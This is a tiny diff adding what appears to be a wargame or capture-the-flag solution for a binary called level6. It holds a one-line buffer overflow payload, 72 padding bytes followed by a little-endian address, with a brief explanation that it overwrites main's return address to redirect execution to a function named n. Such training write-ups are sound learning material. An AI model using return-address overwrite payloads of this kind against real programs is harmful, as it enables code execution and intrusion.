@@ -1,0 +1,4 @@
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+
+fill the buffer to align my addr to the main return address
+then set the main return address to n address
